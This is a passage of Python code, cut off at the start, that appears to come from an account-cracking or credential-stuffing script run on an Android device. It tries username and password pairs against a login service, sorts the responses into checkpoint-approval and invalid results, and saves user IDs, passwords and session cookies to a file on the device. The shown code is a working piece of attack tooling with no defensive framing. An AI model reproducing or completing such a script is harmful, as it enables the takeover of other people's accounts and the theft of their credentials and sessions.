                    open("/sdcard/failed.txt","a").write("%s•%s•%s\n"%(uid,passw,cookies))
        elif "verify" in pos['error']['message']:
            cp+=1
            print("\r\033[1;31m[APPROVAL] %s|%s"%(uid,passw))
        elif "Invalid username or password" in str(pos):
            print("\r\033[1;36m[INVALID] %s|%s"%(uid,passw))
        loop+=1
    except Exception as e:
        time.sleep(5)
main()
